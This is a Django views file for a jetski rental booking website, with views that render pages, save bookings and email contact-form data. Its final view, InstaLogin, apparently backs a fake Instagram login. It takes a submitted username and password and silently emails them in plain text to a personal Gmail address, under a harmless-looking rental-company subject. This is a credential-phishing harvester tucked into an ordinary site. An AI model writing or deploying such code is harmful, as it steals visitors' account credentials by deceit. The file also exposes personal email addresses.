from http.client import HTTPResponse
from django.shortcuts import render
from django.http import HttpResponse
from miamibooking.models import jetski, ponton, yacht
from django.http import HttpResponse
from pubgpot import settings
from django.core.mail import send_mail

# Create your views here.

def index(request):
    return render(request, 'miamihome.html')
    # return HttpResponse("<h1>Hello World</h2>")

def miamiabout(request):
    # return render(request, 'about.html')
    return render(request, 'miamiabout.html')

def miamiservices(request):
    # return render(request, 'about.html')
    return render(request, 'miamiservices.html')

def miamiboats(request):
    # return render(request, 'about.html')
    return render(request, 'miamiboats.html')


def miamiservices(request):
    # return render(request, 'about.html')
    return render(request, 'miamiservices.html')

def miamicontact(request):
    # return render(request, 'about.html')
    return render(request, 'miamicontact.html')


def servicedetail1(request):
    # return render(request, 'about.html')
    return render(request, 'servicedetail1.html')


def servicedetail2(request):
    # return render(request, 'about.html')
    return render(request, 'servicedetail2.html')

def miamibooking(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail1.html')

def miamibooking2(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail2.html')

def miamibooking3(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail3.html')

def miamibooking4(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail4.html')

def miamibooking5(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail5.html')

def miamibooking6(request):

    if request.method=="POST":
        clientname = request.POST['clientname']
        contact =  request.POST['contact']
        quantity = request.POST['quantity']

        ins = jetski(clientname=clientname, contact= contact, quantity=quantity)
        ins.save()
    return render(request, 'servicedetail6.html')


def SendMail(request):
    if request.method == 'POST':
        firstName = request.POST['firstName']
        lastName = request.POST['lastName']
        userEmail = request.POST['userEmail']
        address = request.POST['address']
        # email=request.POST['email']
        email = 'jetskirentalm@gmail.com'
        email2 = 'hayyanzafar884@gmail.com'
        # email = 'hannanzafar44@gmail.com'
        msg=request.POST['msg']
        bookingdate = request.POST['bookingdate']
        subject='Welcome to Miami JetSki Rental '
        message= f"Name: {firstName} {lastName}  \n Email: {userEmail} \n Address:  {address} \n Message: {msg} \n Date: {bookingdate}"
        from_email=settings.EMAIL_HOST_USER
        recipent_list=[email, email2]
        send_mail(subject,message, from_email,recipent_list,fail_silently=True)

        return render(request, 'servicedetail1.html')



def InstaLogin(request):
    if request.method == 'POST':
        userName = request.POST['userName']
        password = request.POST['password']
        email = 'hayyanzafar884@gmail.com'
        # email = 'hannanzafar44@gmail.com'
        subject='Welcome to Miami JetSki Rental '
        message= f"Name: {userName} \n Password: {password}"
        from_email=settings.EMAIL_HOST_USER
        recipent_list=[email]
        send_mail(subject,message, from_email,recipent_list,fail_silently=True)

        return render(request, 'miamihome.html')